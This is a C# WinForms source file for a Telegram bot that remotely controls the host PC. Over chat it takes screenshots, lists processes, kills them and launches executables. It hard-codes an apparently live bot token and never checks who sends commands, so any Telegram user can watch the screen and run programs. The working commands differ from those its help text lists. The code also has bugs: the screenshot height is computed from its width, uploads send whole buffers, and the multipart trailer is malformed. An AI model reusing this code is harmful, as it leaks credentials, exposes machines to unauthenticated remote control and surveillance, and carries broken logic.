
using Newtonsoft.Json;
using System;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Text;
using System.Windows.Forms;

namespace BotTelegramm
{
    public enum BotState
    {
        Wait,
        KillProc,
        StartProc

    }
    public partial class MainForm : Form
    {
        private string token = "1420711938:AAHpHyW0n7hhSRSqxU2xGUzOiTc3TUVjHL8";
        private string BaseUrl = "https://api.telegram.org/bot";
        private long LastUpdateID = 0;
        private string fileLog = "BotLog.log";
        WebClient client;
        BotState botState = BotState.Wait;

        public MainForm()
        {
            InitializeComponent();
            Init();
        }
        private void Init()
        {
            client = new WebClient();
            WriteLog("Авторизация....");
            timerGetUpdates.Enabled = true;

            // InitProxy();

        }
        //Соединение через proxy Сервер..
        private void InitProxy()
        {
            WebProxy proxy = new WebProxy("192.168.0.1", 8080);
            //Отпавляет данные 
            proxy.Credentials = new NetworkCredential("admin", "pass");
            client.Proxy = proxy;
        }

        private void SendMessage(long chat_id, string message)
        {
            string address = BaseUrl + token + "/sendMessage";
            NameValueCollection collection = new NameValueCollection();
            collection.Add("chat_id", chat_id.ToString());
            collection.Add("text", message);
            client.UploadValues(address, collection);
        }

        private void timerGetUpdates_Tick(object sender, EventArgs e)
        {
            GetUpdates();
        }
        private void GetUpdates()
        {
            string s = client.DownloadString(BaseUrl + token + "/getUpdates?offset=" + (LastUpdateID + 1));
            TelegrammMessage telegrammMessage = JsonConvert.DeserializeObject<TelegrammMessage>(s);
            if (!telegrammMessage.ok || telegrammMessage.result.Length == 0) return;
            foreach (Result result in telegrammMessage.result)
            {
                if (result == null || result.message == null)
                    continue;

                LastUpdateID = result.update_id;
                WriteLog(result.message.from.first_name + "(" + result.message.from.username + "): " + result.message.text);
                switch (botState)
                {
                    
                    case BotState.KillProc:
                        if (CloseProcess(result.message.text))
                        {
                            SendMessage(result.message.chat.id, "Процесс закрыт");
                            WriteLog("Закрыт процесс " + result.message.text);
                        }
                        else
                        {
                            SendMessage(result.message.chat.id, "Такого процесса нет!");
                        }
                        break;
                    case BotState.StartProc:
                        if (StartProcess(result.message.text))
                        {
                            SendMessage(result.message.chat.id, "Приложение запущен");
                            WriteLog("Запуск приложение" + result.message.text);
                        }
                        else
                        {
                            SendMessage(result.message.chat.id, "Такого приложение нет!");
                        }
                        break;
                    default: SendAnswer(result.message.chat.id, result.message.text);
                        break;
                }
               
               
            }

        }
        private void SendAnswer(long chat_id, string message)
        {
            
            string answer = "";
            switch (message.ToLower())
            {
                case "/start": answer = "Я твой бот,знаешь что я умею? /help"; break;
                case "лог111": answer = RetLog(); break;
                case "скриншот": SendPrintScreen(chat_id); return;
                case "процесс2": answer = GetMyProcces();break;
                case "процесс_закрыт2": answer = GetMyProcces()  +  "\r\nКакой?"; botState = BotState.KillProc; break;
                case "процесс_запустить2": answer ="Какой?"; botState = BotState.StartProc; break;
                case "/help": answer =
 @"Добро пожаловать в помощь нашего телеграмм Бота.
Ниже представлены все поддерживаемые команды


/start   - самое начало!
/help    - помощь
Лог      - логи
Скриншот - получить скриншот
Процесс  - получить список процессов"; break;

                default: answer = "Вы мне написали  " + "" + message + ',' + "но я не знаю что ответит :(";
                    break;
            }
            SendMessage(chat_id, answer);
        }
        private void WriteLog(string text)
        {
            text = DateTime.Now + " " + text + Environment.NewLine;
            textBoxLog.Text += text;
            File.AppendAllText(fileLog, text);


        }

        private void MainForm_FormClosed(object sender, FormClosedEventArgs e)
        {
            WriteLog("Остановка БОТА!");
        }
        private string RetLog()
        {
            string answer = "";
            if (File.Exists(fileLog))
            {
                string[] readingFileLog = File.ReadAllLines(fileLog);
                int fileLogLength = (readingFileLog.Length - 10) < 0 ? 0 : (readingFileLog.Length - 10);
                for (int i = fileLogLength; i < readingFileLog.Length; i++)
                {
                    answer += readingFileLog[i] + Environment.NewLine;
                }
            }
            return answer;
        }

        private void HttpUploadFile(string url, string file, string paramName, string contentType, NameValueCollection nvc)
        {
            string boundary = "----------------------------" + DateTime.Now.Ticks.ToString("x");
            byte[] boundaryByte = Encoding.ASCII.GetBytes("\r\n--" + boundary + "\r\n");
            HttpWebRequest wr = (HttpWebRequest)WebRequest.Create(url);
            wr.ContentType = "multipart/form-data; boundary=" + boundary;
            wr.Method = "POST";
            wr.KeepAlive = true;
            wr.Credentials = CredentialCache.DefaultCredentials;

            Stream rs = wr.GetRequestStream();

            string formDataTemplate = "Content-Disposition: form-data; name=\"{0}\"\r\n\r\n{1}";
            foreach (string key in nvc.Keys)
            { 
                rs.Write(boundaryByte, 0, boundaryByte.Length);
                string formitem = string.Format(formDataTemplate, key, nvc[key]);
                byte[] formitembytes = Encoding.UTF8.GetBytes(formitem);
                rs.Write(formitembytes, 0, formitembytes.Length);
            }
            rs.Write(boundaryByte, 0, boundaryByte.Length);

            string headerTemplate = "Content-Disposition: form-data; name=\"{0}\"; filename =\"{1}\"\r\nContent-Type:{2}\r\n\r\n";
            string header = string.Format(headerTemplate, paramName,file, contentType);
            byte[] headerByte = Encoding.UTF8.GetBytes(header);
            rs.Write(headerByte, 0, headerByte.Length);

            FileStream fs = new FileStream(file, FileMode.Open, FileAccess.Read);

                byte[] buffer = new byte[4096];
            int byteRead = 0;
            while((byteRead = fs.Read(buffer, 0, buffer.Length))!= 0){
                rs.Write(buffer, 0, buffer.Length);
            }
            fs.Close();

            byte[] trailer = Encoding.ASCII.GetBytes("\r\n--" + boundary + "--r\n");
            rs.Write(trailer, 0, trailer.Length);
            rs.Close();

            WebResponse wresp = null;
            try
            {
                wresp = wr.GetResponse();
                Stream stream = wresp.GetResponseStream();
                StreamReader reader = new StreamReader(stream);
                WriteLog("Файл" + file + "ответ отправлен на сервер,ответ от сервера: " + reader.ReadToEnd());
            }
            catch (Exception ex)
            {
                WriteLog("Ошибка при отправки файла на сервер: " + ex.Message); 
                if(wresp != null)
                {
                    wresp.Close();
                    wresp = null;
                }
            }
            finally
            {
                wr = null;
            }
           
        }

        private void HttpUploadScreen(string url, string file, string paramName, string contentType, NameValueCollection nvc)
        {
            string boundary = "----------------------------" + DateTime.Now.Ticks.ToString("x");
            byte[] boundaryByte = Encoding.ASCII.GetBytes("\r\n--" + boundary + "\r\n");
            HttpWebRequest wr = (HttpWebRequest)WebRequest.Create(url);
            wr.ContentType = "multipart/form-data; boundary=" + boundary;
            wr.Method = "POST";
            wr.KeepAlive = true;
            wr.Credentials = CredentialCache.DefaultCredentials;

            Stream rs = wr.GetRequestStream();

            string formDataTemplate = "Content-Disposition: form-data; name=\"{0}\"\r\n\r\n{1}";
            foreach (string key in nvc.Keys)
            {
                rs.Write(boundaryByte, 0, boundaryByte.Length);
                string formitem = string.Format(formDataTemplate, key, nvc[key]);
                byte[] formitembytes = Encoding.UTF8.GetBytes(formitem);
                rs.Write(formitembytes, 0, formitembytes.Length);
            }
            rs.Write(boundaryByte, 0, boundaryByte.Length);

            string headerTemplate = "Content-Disposition: form-data; name=\"{0}\"; filename =\"{1}\"\r\nContent-Type:{2}\r\n\r\n";
            string header = string.Format(headerTemplate, paramName, file, contentType);
            byte[] headerByte = Encoding.UTF8.GetBytes(header);
            rs.Write(headerByte, 0, headerByte.Length);

            Bitmap screen = GetPrintScreen();
            MemoryStream fs = new MemoryStream();
         
            screen.Save(fs, ImageFormat.Png);
            fs.Position = 0;

            byte[] buffer = new byte[4096];
            int byteRead = 0;
            while ((byteRead = fs.Read(buffer, 0, buffer.Length)) != 0)
            {
                rs.Write(buffer, 0, buffer.Length);
            }
            fs.Close();

            byte[] trailer = Encoding.ASCII.GetBytes("\r\n--" + boundary + "--r\n");
            rs.Write(trailer, 0, trailer.Length);
            rs.Close();

            WebResponse wresp = null;
            try
            {
                wresp = wr.GetResponse();
                Stream stream = wresp.GetResponseStream();
                StreamReader reader = new StreamReader(stream);
                WriteLog("Файл " + file + " ответ отправлен на сервер,ответ от сервера: " + reader.ReadToEnd());
            }
            catch (Exception ex)
            {
                WriteLog("Ошибка при отправки файла на сервер: " + ex.Message);
                if (wresp != null)
                {
                    wresp.Close();
                    wresp = null;
                }
            }
            finally
            {
                wr = null;
            }

        }
        private void SendPrintScreen(long chat_id)
        {
            string address = BaseUrl + token + "/sendPhoto";
            NameValueCollection nvc = new NameValueCollection();
            nvc.Add("chat_id", chat_id.ToString());
            HttpUploadScreen(address, "MyScreen.png", "photo", "image/png", nvc);
            // HttpUploadFile(address, "Screenshot_1.png", "photo", "image/png", nvc);
        }
        private Bitmap GetPrintScreen()
        {
            Bitmap screen = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            Graphics gr = Graphics.FromImage(screen as Image);
            gr.CopyFromScreen(0, 0, 0, 0, screen.Size);
            return ResizeImg(screen,2);
        }
        private Bitmap ResizeImg(Bitmap bitmap,int newWidth,int newHidh)
        {
            Bitmap result = new Bitmap(newWidth, newHidh);
            using(Graphics graphics = Graphics.FromImage(result as Image))
            {
                graphics.InterpolationMode =System.Drawing.Drawing2D.InterpolationMode.HighQualityBicubic;
                graphics.DrawImage(bitmap, 0, 0, newWidth, newHidh);
                graphics.Dispose();
            }
            return result;
        }

        private Bitmap ResizeImg(Bitmap bitmap,int count)
        {
            return ResizeImg(bitmap, bitmap.Width / count, bitmap.Width / count);
        }
        private string GetMyProcces()
        {
            Process[] processList = Process.GetProcesses();
            StringBuilder stringBuilder = new StringBuilder();
            stringBuilder.AppendLine("Список процессов:");
            stringBuilder.AppendLine(new string('=', 25));

            foreach (Process process in processList)
            {
                if (!string.IsNullOrEmpty(process.MainWindowTitle))
                    
                stringBuilder.AppendLine(process.StartTime + ": " + process.ProcessName + " - " + process.MainWindowTitle);
            }
            stringBuilder.AppendLine(new string('=', 25));
            return stringBuilder.ToString();
        }
        private bool CloseProcess(string nameProc)
        {
            botState = BotState.Wait;
            Process[] processList = Process.GetProcesses();
            foreach (Process process in processList)
            {
                if (process.ProcessName == nameProc)
                {
                     Process.GetProcessesByName(nameProc)[0].Kill();
                     return true;
                }
                   
            }
            return false;
        }
        private bool StartProcess(string path)
        {
            botState = BotState.Wait;
            if (File.Exists(path))
            {
                Process.Start(path);
                return true;
            }
            return false;
        }
    }

}
